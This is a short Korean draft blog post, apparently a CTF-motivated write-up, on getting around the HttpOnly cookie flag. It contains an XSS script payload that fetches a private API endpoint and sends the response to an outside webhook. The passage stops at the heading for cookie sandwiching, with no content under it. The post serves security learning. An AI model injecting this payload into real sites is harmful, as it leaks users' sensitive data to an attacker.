---
title: Httponly bypass
published: 2025-10-15
description: " "
tags: [Analysis, flask, cookie_sandwiching]
category: Analysis
draft: true
---

COSS CTF와 드림핵에서 관련 문제가 출제 되었습니다. 풀기 힘들어서 해당 기법에 대해 정리해보려 합니다.

## Httponly
Httponly는 클라이언트 측에서 쿠키에 접근하지 못하게 하는 속성입니다.

```
Set-Cookie: session=abcd; httponly; secure; path=/;
```

위처럼 서버가 `Set-Cookie` 헤더에 httponly 필드를 포함시킨다면, javascript를 통한 쿠키 접근이 불가능해집니다.
이는 서비스에 XSS 취약점이 존재할 때 공격자가 쿠키를 탈취하기 어렵게 한다.

## Bypass Trick
### Data Exfiltration
세션을 탈취하지 않고 민감 정보만 빼오는 방식입니다. 리얼월드 버그바운티에서 XSS 트리거는 성공했지만 세션 탈취가 어려운 상황을 자주 마주할 수 있습니다.
XSS로 삽입된 스크립트 상에서 `fetch` 등을 사용해 민감 정보를 제공하는 api에 요청 후 응답으로 받은 정보만 웹훅으로 전송하는 방식으로 세션을 훔치지 않고도 민감 정보를 유출 할 수 있습니다.

```html
<script>
  fetch('/api/superprivateinfo')
  .then(r => r.text())
  .then(t => {
    location.href = `https://webhook?info=${t}`
  })
</script>
```

Bypass라고 할 수는 없겠지만 이런게 리얼월드에서 꽤 도움된다는거 정도만 써보고 싶었습니다

### Cookie Sandwiching
이 글을 쓰는 이유이기도 한 기법입니다.

